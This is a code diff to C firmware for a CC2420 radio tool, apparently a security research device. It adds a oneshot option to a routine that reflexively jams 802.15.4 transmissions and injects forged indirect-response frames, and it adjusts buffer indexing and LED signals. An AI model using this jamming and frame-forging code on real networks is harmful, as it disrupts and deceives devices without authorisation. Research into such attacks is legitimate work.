@@ -560,14 +560,22 @@ void ccspi_handle_fn( uint8_t const app,
 //                  TXFIFO and RXFIFO are flushed, and the process repeats.
 //  Note: This requires at least three protocol retries sent by the target.
 //        May take a few attempts to properly align within the retry sequences.
-    debugstr("Indirect data forging until reset.");
+//cmddata[] format:
+//  [0]:       0x00: Loops forever; any other value: Oneshot mode
+//  [1]:       MAC frame length (PHY PDU)
+//  [2:[1]-1]: Staged frame to be injected
+    if (cmddata[0] == 0x00) {
+        debugstr("Indirect data forging until reset.");
+    } else {
+        debugstr("Indirect data forging oneshot mode.");
+    }
     debugstr("Preloaded response:");
-    for(i=0;i<cmddata[0]+1;i++) {
+    for(i=1;i<cmddata[1]+2;i++) {  //cmddata[1]: length of MAC frame to be injected
         itoa(cmddata[i], byte, 16);
         debugstr(byte);
     }
     txdata(app, verb, len);
-    while(1) {
+    do {  // Run at least once; will look forever if specified (byte 0 of RF_reflexjam_indirect(string))
         #define INDBUFLEN 10
         char pktbuf[INDBUFLEN];
         //char rxfcf0;
@@ -605,8 +613,8 @@ void ccspi_handle_fn( uint8_t const app,
             return;
         }
         //Turn on LED 2 (green) as signal
-	    PLED2DIR |= PLED2PIN;
-	    PLED2OUT &= ~PLED2PIN;
+	PLED2DIR |= PLED2PIN;
+	PLED2OUT |= PLED2PIN;
 
         //Load the jamming packet
         CLRSS;
@@ -704,14 +712,10 @@ void ccspi_handle_fn( uint8_t const app,
         ccspitrans8(0x09);  //SFLUSHTX
         SETSS;
 
-        //LED 1 (yellow)
-	PLEDDIR |= PLEDPIN;
-	PLEDOUT &= ~PLEDPIN;
-
         //Load the forged indirect response payload frame
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
-        for(i=0;i<cmddata[0]+4;i++)  // Sending a few extra; sometime the FCS gets garbled
+        for(i=1;i<cmddata[1]+5;i++)  // Sending a few extra; sometime the FCS gets garbled
           ccspitrans8(cmddata[i]);
         SETSS;
         //Transmit the forged indirect response frame
@@ -731,8 +735,11 @@ void ccspi_handle_fn( uint8_t const app,
 
         //Turn off LED 2 (green) as signal
 	PLED2DIR |= PLED2PIN;
-	PLED2OUT |= PLED2PIN;
-    }
+	PLED2OUT &= ~PLED2PIN;
+        //LED 1 (yellow)
+        PLEDDIR |= PLEDPIN;
+        PLEDOUT &= ~PLEDPIN;
+    } while (cmddata[0] == 0x00);  //First byte of string passed from client denotes oneshot/loop mode
 #else
     debugstr("Can't reflexively jam without SFD, FIFO, FIFOP, and P2LEDx definitions - try using telosb platform.");
     txdata(app,NOK,0);
